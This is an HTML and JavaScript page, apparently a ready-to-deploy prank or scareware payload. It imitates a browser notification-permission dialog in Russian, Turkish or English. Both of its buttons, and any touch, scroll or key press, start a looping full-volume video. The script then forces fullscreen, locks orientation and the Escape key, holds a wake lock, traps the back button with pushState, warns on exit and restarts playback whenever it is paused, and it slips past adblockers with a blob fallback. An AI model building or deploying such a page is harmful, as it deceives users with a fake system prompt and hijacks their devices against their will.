<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#ffffff">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<title>Loading…</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    width: 100%;
    height: 100%;
    overflow: hidden;
    background: #ffffff;
    touch-action: none;
    overscroll-behavior: none;
    -webkit-tap-highlight-color: transparent;
    user-select: none;
    -webkit-user-select: none;
    -webkit-touch-callout: none;
    -webkit-user-drag: none;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, Roboto, "Helvetica Neue", Arial, sans-serif;
  }

  /* ==================== УВЕДОМЛЕНИЕ ==================== */
  #notice {
    position: fixed;
    top: calc(12px + env(safe-area-inset-top, 0px));
    left: 12px;
    right: 12px;
    max-width: 420px;
    margin: 0 auto;
    z-index: 20;
    border-radius: 16px;
    overflow: hidden;
    background: rgba(255, 255, 255, 0.92);
    -webkit-backdrop-filter: blur(20px) saturate(180%);
    backdrop-filter: blur(20px) saturate(180%);
    box-shadow:
      0 10px 40px rgba(0, 0, 0, 0.18),
      0 2px 8px rgba(0, 0, 0, 0.08),
      0 0 0 0.5px rgba(0, 0, 0, 0.06);
    color: #111;
    opacity: 1;
    transform: translateY(0);
    transition: opacity 0.25s ease, transform 0.25s ease;
    will-change: opacity, transform;
  }

  #notice.hidden {
    opacity: 0;
    transform: translateY(-8px);
    pointer-events: none;
  }

  #notice .body {
    display: flex;
    align-items: flex-start;
    gap: 12px;
    padding: 14px 16px 12px;
  }

  #notice .icon {
    flex: 0 0 38px;
    width: 38px;
    height: 38px;
    border-radius: 9px;
    background: linear-gradient(145deg, #2b8cff, #0a6cff);
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 2px 6px rgba(10, 108, 255, 0.35);
  }
  #notice .icon svg {
    width: 22px;
    height: 22px;
    display: block;
    fill: #fff;
  }

  #notice .text { flex: 1 1 auto; min-width: 0; }

  #notice .title {
    font-size: 15px;
    font-weight: 600;
    line-height: 1.25;
    color: #111;
    margin-bottom: 3px;
    letter-spacing: -0.01em;
  }

  #notice .message {
    font-size: 13.5px;
    line-height: 1.35;
    color: #3c3c43;
    word-wrap: break-word;
    overflow-wrap: break-word;
  }

  #notice .message b {
    font-weight: 600;
    color: #111;
  }

  /* ==================== КНОПКИ ==================== */
  #notice .actions {
    display: flex;
    border-top: 0.5px solid rgba(60, 60, 67, 0.16);
  }

  #notice .actions button {
    flex: 1 1 0;
    position: relative;
    border: none;
    background: transparent;
    font: inherit;
    font-size: 15px;
    line-height: 1;
    padding: 14px 10px;
    cursor: pointer;
    color: #0a6cff;
    font-weight: 500;
    letter-spacing: -0.01em;
    -webkit-tap-highlight-color: transparent;
    outline: none;
    overflow: hidden;
    isolation: isolate;
  }

  #notice .actions button + button {
    border-left: 0.5px solid rgba(60, 60, 67, 0.16);
  }

  #notice .actions button.deny {
    color: #0a6cff;
    font-weight: 400;
  }

  #notice .actions button.allow {
    color: #0a6cff;
    font-weight: 600;
  }

  /* Прогресс-заливка на кнопке "Разрешить" */
  #notice .actions button.allow::before {
    content: "";
    position: absolute;
    inset: 0;
    background: rgba(10, 108, 255, 0.12);
    transform-origin: left center;
    transform: scaleX(var(--progress, 0));
    transition: none;
    z-index: -1;
    pointer-events: none;
  }

  /* Пульсация после заполнения таймера */
  @keyframes pulseGlow {
    0%, 100% { box-shadow: inset 0 0 0 0 rgba(10, 108, 255, 0); }
    50%      { box-shadow: inset 0 0 0 2px rgba(10, 108, 255, 0.25); }
  }
  #notice .actions button.allow.pulse {
    animation: pulseGlow 1.4s ease-in-out infinite;
  }

  /* Активное нажатие */
  #notice .actions button:active {
    background: rgba(10, 108, 255, 0.08);
  }

  /* ==================== ВИДЕО ==================== */
  #video {
    position: fixed;
    inset: 0;
    width: 100%;
    height: 100%;
    object-fit: cover;
    background: #000;
    z-index: 5;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.18s linear;
  }
  #video.active { opacity: 1; pointer-events: auto; }

  #video::-webkit-media-controls,
  #video::-webkit-media-controls-enclosure,
  #video::-webkit-media-controls-panel,
  #video::-webkit-media-controls-play-button,
  #video::-webkit-media-controls-fullscreen-button,
  #video::-webkit-media-controls-start-playback-button,
  #video::-webkit-media-controls-overlay-play-button,
  #video::-webkit-media-controls-current-time-display,
  #video::-webkit-media-controls-time-remaining-display,
  #video::-webkit-media-controls-timeline,
  #video::-webkit-media-controls-volume-slider {
    display: none !important;
    -webkit-appearance: none !important;
    opacity: 0 !important;
    pointer-events: none !important;
  }
  #video::-moz-media-controls { display: none !important; }

  /* ==================== ОШИБКА ==================== */
  #error-msg {
    position: fixed;
    inset: 0;
    z-index: 30;
    display: none;
    align-items: center;
    justify-content: center;
    padding: 24px;
    color: #b00020;
    font-size: 16px;
    line-height: 1.4;
    text-align: center;
    background: #fff;
  }
  #error-msg.show { display: flex; }

  /* ==================== ТЁМНАЯ ТЕМА ==================== */
  @media (prefers-color-scheme: dark) {
    html, body { background: #000; }
    #notice {
      background: rgba(28, 28, 30, 0.92);
      color: #fff;
      box-shadow:
        0 10px 40px rgba(0, 0, 0, 0.6),
        0 2px 8px rgba(0, 0, 0, 0.4),
        0 0 0 0.5px rgba(255, 255, 255, 0.08);
    }
    #notice .title { color: #fff; }
    #notice .message { color: #c7c7cc; }
    #notice .message b { color: #fff; }
    #notice .actions { border-top-color: rgba(255, 255, 255, 0.14); }
    #notice .actions button + button { border-left-color: rgba(255, 255, 255, 0.14); }
    #notice .actions button { color: #4a9eff; }
    #notice .actions button.deny { color: #4a9eff; }
    #notice .actions button.allow { color: #4a9eff; }
    #notice .actions button.allow::before { background: rgba(74, 158, 255, 0.16); }
    #notice .actions button:active { background: rgba(74, 158, 255, 0.14); }
    #error-msg { background: #000; color: #ff6b6b; }
  }
</style>
</head>
<body>

<div id="notice" role="dialog" aria-live="polite">
  <div class="body">
    <div class="icon" aria-hidden="true">
      <svg viewBox="0 0 24 24">
        <path d="M12 22a2.5 2.5 0 0 0 2.45-2h-4.9A2.5 2.5 0 0 0 12 22zm7-6.5V11a7 7 0 0 0-5.25-6.78V3.75a1.75 1.75 0 1 0-3.5 0v.47A7 7 0 0 0 5 11v4.5l-1.65 1.65A1 1 0 0 0 4 18.86h16a1 1 0 0 0 .65-1.71L19 15.5z"/>
      </svg>
    </div>
    <div class="text">
      <div class="title" id="notice-title"></div>
      <div class="message" id="notice-message"></div>
    </div>
  </div>
  <div class="actions">
    <button type="button" class="deny"  data-action="deny"  id="btn-deny"></button>
    <button type="button" class="allow" data-action="allow" id="btn-allow"></button>
  </div>
</div>

<video id="video"
       src="video.mp4"
       playsinline
       webkit-playsinline
       preload="auto"
       disablepictureinpicture
       disableremoteplayback></video>

<div id="error-msg"></div>

<script>
(function () {
  "use strict";

  /* =========================================================
     НАСТРОЙКИ
     ========================================================= */
  const CONFIG = {
    videoSrc:            "video.mp4",
    siteName:            "example.com",   // ← название сайта в уведомлении
    loopVideo:           true,
    iOSNativeFullscreen: true,
    lockOrientation:     true,
    preventExit:         true,
    wakeLock:            true,
    useWebAudio:         true,
    startupAttempt:      true,
    startupDelay:        800,
    retryInterval:       1500,
    gestureThrottle:     450,
    burstDelays:         [0, 50, 200, 600, 1500, 3000],
    tryKeyboardLock:     true,
    tryBlobFallback:     true,
    progressDuration:    5000,            // мс — заполнение кнопки «Разрешить»
  };

  const notice    = document.getElementById("notice");
  const titleEl   = document.getElementById("notice-title");
  const msgEl     = document.getElementById("notice-message");
  const btnAllow  = document.getElementById("btn-allow");
  const btnDeny   = document.getElementById("btn-deny");
  const video     = document.getElementById("video");
  const errBox    = document.getElementById("error-msg");

  /* =========================================================
     ЛОКАЛИЗАЦИЯ
     ========================================================= */
  const STRINGS = {
    ru: {
      title:   "Уведомления",
      message: (site) => `<b>${site}</b> запрашивает разрешение на отправку уведомлений`,
      allow:   "Разрешить",
      deny:    "Не сейчас",
    },
    tr: {
      title:   "Bildirimler",
      message: (site) => `<b>${site}</b> bildirim göndermek için izin istiyor`,
      allow:   "İzin ver",
      deny:    "Şimdi değil",
    },
    en: {
      title:   "Notifications",
      message: (site) => `<b>${site}</b> wants to send you notifications`,
      allow:   "Allow",
      deny:    "Not now",
    },
  };

  function detectLang() {
    const list = (navigator.languages && navigator.languages.length)
      ? navigator.languages
      : [navigator.language || "en"];
    for (const l of list) {
      const code = String(l || "").toLowerCase();
      if (code.startsWith("ru")) return "ru";
      if (code.startsWith("tr")) return "tr";
      if (code.startsWith("en")) return "en";
    }
    return "en";
  }

  const LANG = detectLang();
  const L = STRINGS[LANG] || STRINGS.en;
  console.log("[lang]", LANG);

  /* =========================================================
     ДЕТЕКТ БРАУЗЕРА
     ========================================================= */
  const UA = navigator.userAgent;
  const isIOS     = /iPad|iPhone|iPod/.test(UA) ||
                    (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
  const isAndroid = /Android/i.test(UA);
  const docEl     = document.documentElement;
  const hasDocFs  = !!(docEl.requestFullscreen || docEl.webkitRequestFullscreen ||
                       docEl.mozRequestFullScreen || docEl.msRequestFullscreen);
  const hasIOSFs  = typeof video.webkitEnterFullscreen === "function";

  console.log("[env]", { isIOS, isAndroid, hasDocFs, hasIOSFs });

  /* =========================================================
     СОСТОЯНИЕ
     ========================================================= */
  let firstGestureDone = false;
  let activated        = false;
  let lastFsAttempt    = 0;
  let wakeLock         = null;
  let audioCtx         = null;
  let audioSourceDone  = false;
  let keyboardLocked   = false;
  let fallbackTried    = false;
  let progressRaf      = 0;
  let progressStart    = 0;
  let noticeHidden     = false;

  /* =========================================================
     РЕНДЕР УВЕДОМЛЕНИЯ
     ========================================================= */
  function renderNotice() {
    titleEl.textContent = L.title;
    msgEl.innerHTML     = L.message(CONFIG.siteName);
    btnAllow.textContent = L.allow;
    btnDeny.textContent  = L.deny;
  }
  renderNotice();

  /* =========================================================
     ПРОГРЕСС КНОПКИ «РАЗРЕШИТЬ» (только визуал, НЕ автозапуск)
     ========================================================= */
  function startProgress() {
    if (noticeHidden) return;
    progressStart = performance.now();

    function tick(now) {
      if (noticeHidden) return;
      const elapsed = now - progressStart;
      const p = Math.min(elapsed / CONFIG.progressDuration, 1);
      btnAllow.style.setProperty("--progress", p.toFixed(4));

      if (p < 1) {
        progressRaf = requestAnimationFrame(tick);
      } else {
        // 100% — ничего автоматически не запускаем.
        // Мягкая пульсация-приглашение нажать.
        btnAllow.classList.add("pulse");
      }
    }
    cancelAnimationFrame(progressRaf);
    progressRaf = requestAnimationFrame(tick);
  }

  function stopProgress() {
    cancelAnimationFrame(progressRaf);
    progressRaf = 0;
  }

  /* =========================================================
     СКРЫТИЕ УВЕДОМЛЕНИЯ
     ========================================================= */
  function hideNotice() {
    if (noticeHidden) return;
    noticeHidden = true;
    stopProgress();
    notice.classList.add("hidden");
    // После анимации — полностью убрать из потока
    setTimeout(() => { notice.style.display = "none"; }, 300);
  }

  /* =========================================================
     WEBAUDIO
     ========================================================= */
  function setupWebAudio() {
    if (!CONFIG.useWebAudio || audioSourceDone) return;
    audioSourceDone = true;
    try {
      const AC = window.AudioContext || window.webkitAudioContext;
      if (!AC) return;
      audioCtx = new AC();
      const src  = audioCtx.createMediaElementSource(video);
      const gain = audioCtx.createGain();
      gain.gain.value = 1.0;
      src.connect(gain);
      gain.connect(audioCtx.destination);
      if (audioCtx.state === "suspended") audioCtx.resume().catch(() => {});
      console.log("[webaudio] ready");
    } catch (e) {
      console.warn("[webaudio] failed:", e);
      audioCtx = null;
    }
  }

  /* =========================================================
     FULLSCREEN
     ========================================================= */
  function isInFullscreen() {
    return !!(
      document.fullscreenElement ||
      document.webkitFullscreenElement ||
      document.mozFullScreenElement ||
      document.msFullscreenElement ||
      video.webkitDisplayingFullscreen
    );
  }

  function requestDocFullscreen() {
    if (isInFullscreen()) return true;
    try {
      if (docEl.requestFullscreen) {
        docEl.requestFullscreen({ navigationUI: "hide" }).catch(() => {});
        return true;
      }
      if (docEl.webkitRequestFullscreen) { docEl.webkitRequestFullscreen(); return true; }
      if (docEl.mozRequestFullScreen)    { docEl.mozRequestFullScreen();    return true; }
      if (docEl.msRequestFullscreen)     { docEl.msRequestFullscreen();     return true; }
    } catch (e) {}
    return false;
  }

  function requestIOSFullscreen() {
    try {
      if (video.webkitEnterFullscreen && !video.webkitDisplayingFullscreen) {
        video.webkitEnterFullscreen();
        return true;
      }
    } catch (e) {}
    return false;
  }

  function lockOrientation() {
    if (!CONFIG.lockOrientation) return;
    try {
      if (screen.orientation && screen.orientation.lock) {
        screen.orientation.lock("landscape").catch(() => {});
      } else if (screen.lockOrientation) {
        screen.lockOrientation("landscape");
      } else if (screen.mozLockOrientation) {
        screen.mozLockOrientation("landscape");
      } else if (screen.msLockOrientation) {
        screen.msLockOrientation("landscape");
      }
    } catch (e) {}
  }

  function tryKeyboardLock() {
    if (!CONFIG.tryKeyboardLock || keyboardLocked) return;
    if (!(navigator.keyboard && navigator.keyboard.lock)) return;
    try {
      navigator.keyboard.lock(["Escape"]).then(() => {
        keyboardLocked = true;
        console.log("[kbd] Escape locked");
      }).catch(() => {});
    } catch (e) {}
  }

  function tryFullscreen() {
    if (hasDocFs) {
      requestDocFullscreen();
      lockOrientation();
      return;
    }
    if (isIOS && CONFIG.iOSNativeFullscreen && hasIOSFs) {
      requestIOSFullscreen();
      return;
    }
  }

  function burstRetryFullscreen() {
    CONFIG.burstDelays.forEach(ms => {
      setTimeout(() => { if (firstGestureDone) tryFullscreen(); }, ms);
    });
  }

  /* =========================================================
     WAKE LOCK
     ========================================================= */
  async function requestWakeLock() {
    if (!CONFIG.wakeLock || wakeLock) return;
    try {
      if ("wakeLock" in navigator) {
        wakeLock = await navigator.wakeLock.request("screen");
        wakeLock.addEventListener("release", () => { wakeLock = null; });
      }
    } catch (e) {}
  }

  /* =========================================================
     FALLBACK ИСТОЧНИК (обход адблоков)
     ========================================================= */
  async function tryFallbackSource() {
    if (!CONFIG.tryBlobFallback || fallbackTried) return;
    fallbackTried = true;
    try {
      const url = CONFIG.videoSrc + "?cb=" + Date.now();
      const res = await fetch(url, { cache: "no-store" });
      if (!res.ok) throw new Error("HTTP " + res.status);
      const blob    = await res.blob();
      const blobUrl = URL.createObjectURL(blob);
      video.src = blobUrl;
      video.load();
      video.muted  = false;
      video.volume = 1.0;
      const p = video.play();
      if (p && p.catch) p.catch(() => {});
      console.log("[fallback] blob loaded, size", blob.size);
    } catch (e) {
      console.error("[fallback] failed:", e);
      showError("Видео заблокировано. Отключите адблок для этого сайта и обновите страницу.");
    }
  }

  function showError(msg) {
    errBox.textContent = msg;
    errBox.classList.add("show");
  }

  /* =========================================================
     ВОСПРОИЗВЕДЕНИЕ
     ========================================================= */
  function ensurePlaying() {
    if (document.hidden) return;
    if (video.paused) {
      video.muted  = false;
      video.volume = 1.0;
      const p = video.play();
      if (p && p.catch) p.catch(() => {});
    }
  }

  /* =========================================================
     АКТИВАЦИЯ (первый жест)
     ========================================================= */
  function onGesture() {
    if (!firstGestureDone) {
      firstGestureDone = true;

      hideNotice();
      video.classList.add("active");

      video.muted  = false;
      video.volume = 1.0;
      video.loop   = CONFIG.loopVideo;

      // play() первым — синхронно, в теле жеста
      const playPromise = video.play();

      // Fullscreen — сразу после play()
      tryFullscreen();
      lockOrientation();
      requestWakeLock();

      if (playPromise && playPromise.then) {
        playPromise.then(() => {
          if (!activated) {
            activated = true;
            setupWebAudio();
            burstRetryFullscreen();
            console.log("[activate] playing with sound");
          }
        }).catch((err) => {
          console.warn("[activate] play() rejected:", err && err.name);
          // Не muted-костыли. Диалог уже скрыт, но видео не пошло.
          // Показываем его обратно, ждём следующий жест.
          noticeHidden = false;
          notice.style.display = "";
          notice.classList.remove("hidden");
          btnAllow.classList.add("pulse");
          // Сбрасываем флаг, чтобы следующий жест попробовал снова
          firstGestureDone = false;
        });
      }
      return;
    }

    // Повторные жесты — throttled retry fullscreen
    const now = Date.now();
    if (now - lastFsAttempt > CONFIG.gestureThrottle) {
      lastFsAttempt = now;
      tryFullscreen();
      ensurePlaying();
    }
  }

  /* =========================================================
     КНОПКИ УВЕДОМЛЕНИЯ
     ========================================================= */
  btnAllow.addEventListener("click", (e) => {
    // Жест уже произошёл; onGesture вызовется и через document,
    // но прямой вызов гарантирует порядок.
    onGesture();
  });
  btnDeny.addEventListener("click", (e) => {
    onGesture();
  });

  // Внутри кнопок не даём событию «утечь» в document-capture дважды,
  // но НЕ блокируем — onGesture защищён флагом firstGestureDone.
  // (Ничего не делаем — пусть всплывает.)

  /* =========================================================
     ПОДПИСКИ НА ВСЕ ДЕЙСТВИЯ
     ========================================================= */
  const PASSIVE_EVENTS = [
    "touchstart", "touchend", "touchcancel", "touchforcechange",
    "pointerdown", "pointerup", "pointercancel",
    "mousedown", "mouseup", "mousemove",
    "click", "dblclick", "auxclick",
    "keydown", "keyup", "keypress",
    "wheel", "scroll",
    "gesturestart", "gesturechange", "gestureend",
    "popstate", "hashchange",
  ];

  PASSIVE_EVENTS.forEach(name => {
    try {
      document.addEventListener(name, onGesture, { capture: true, passive: true });
    } catch (e) {}
  });

  // Блокирующие (preventDefault) — passive: false
  document.addEventListener("touchmove", e => {
    e.preventDefault();
    onGesture();
  }, { capture: true, passive: false });

  document.addEventListener("contextmenu", e => {
    e.preventDefault();
    e.stopPropagation();
    onGesture();
    return false;
  }, { capture: true, passive: false });

  document.addEventListener("selectstart", e => e.preventDefault(), { passive: false });
  document.addEventListener("dragstart",   e => e.preventDefault(), { passive: false });

  /* =========================================================
     ESCAPE
     ========================================================= */
  document.addEventListener("keydown", e => {
    if (e.key === "Escape" || e.key === "Esc" || e.keyCode === 27) {
      e.preventDefault();
      e.stopPropagation();
      onGesture();
      return false;
    }
  }, { capture: true, passive: false });

  /* =========================================================
     FULLSCREEN CHANGE
     ========================================================= */
  ["fullscreenchange", "webkitfullscreenchange", "mozfullscreenchange", "MSFullscreenChange"]
    .forEach(evt => {
      document.addEventListener(evt, () => {
        if (!firstGestureDone) return;
        if (!isInFullscreen()) {
          burstRetryFullscreen();
        } else {
          tryKeyboardLock();
        }
      });
    });

  video.addEventListener("webkitendfullscreen", () => {
    if (!firstGestureDone) return;
    burstRetryFullscreen();
  });

  /* =========================================================
     ЖИЗНЕННЫЙ ЦИКЛ
     ========================================================= */
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState !== "visible") return;
    if (!firstGestureDone) return;
    ensurePlaying();
    tryFullscreen();
    requestWakeLock();
    if (audioCtx && audioCtx.state === "suspended") audioCtx.resume().catch(() => {});
  });

  window.addEventListener("focus", () => {
    if (!firstGestureDone) return;
    ensurePlaying();
    tryFullscreen();
  });

  window.addEventListener("resize", () => {
    if (!firstGestureDone) return;
    tryFullscreen();
  });

  window.addEventListener("orientationchange", () => {
    if (!firstGestureDone) return;
    setTimeout(tryFullscreen, 200);
  });

  /* =========================================================
     СОБЫТИЯ ВИДЕО
     ========================================================= */
  video.addEventListener("error", () => {
    console.error("[video] error:", video.error);
    tryFallbackSource();
  });

  video.addEventListener("stalled", () => {
    setTimeout(ensurePlaying, 1000);
  });

  video.addEventListener("pause", () => {
    if (firstGestureDone && !document.hidden) {
      setTimeout(() => ensurePlaying(), 0);
    }
  });

  video.addEventListener("ended", () => {
    if (!firstGestureDone) return;
    try { video.currentTime = 0; } catch (e) {}
    ensurePlaying();
  });

  video.addEventListener("loadedmetadata", () => {
    console.log("[video] metadata:",
      video.videoWidth + "x" + video.videoHeight, video.duration + "s");
  });

  /* =========================================================
     STARTUP ATTEMPT (один раз, до жеста)
     ========================================================= */
  function startupAttempt() {
    if (firstGestureDone) return;
    console.log("[startup] trying auto-play + fullscreen");

    video.muted  = false;
    video.volume = 1.0;
    video.loop   = CONFIG.loopVideo;

    const p = video.play();
    if (p && p.catch) p.catch(() => {});

    tryFullscreen();
    requestWakeLock();

    if (p && p.then) {
      p.then(() => {
        activated = true;
        setupWebAudio();
        console.log("[startup] autoplay succeeded");
      }).catch(() => {
        console.log("[startup] autoplay rejected (expected)");
      });
    }
  }

  /* =========================================================
     POPSTATE / BEFOREUNLOAD
     ========================================================= */
  if (CONFIG.preventExit) {
    try {
      history.pushState(null, "", location.href);
      window.addEventListener("popstate", () => {
        history.pushState(null, "", location.href);
        if (firstGestureDone) tryFullscreen();
      });
    } catch (e) {}

    window.addEventListener("beforeunload", e => {
      if (!firstGestureDone) return;
      const msg = "Видео активно. Точно выйти?";
      e.preventDefault();
      e.returnValue = msg;
      return msg;
    });
  }

  /* =========================================================
     ПЕРИОДИЧЕСКИЙ РЕТРАЙ
     ========================================================= */
  setInterval(() => {
    if (!firstGestureDone) return;
    tryFullscreen();
    ensurePlaying();
    if (!wakeLock) requestWakeLock();
  }, CONFIG.retryInterval);

  /* =========================================================
     СТАРТ
     ========================================================= */
  try { video.load(); } catch (e) {}

  // Запускаем визуальный прогресс-бар на кнопке
  startProgress();

  if (CONFIG.startupAttempt) {
    setTimeout(startupAttempt, CONFIG.startupDelay);
  }

})();
</script>
</body>
</html>
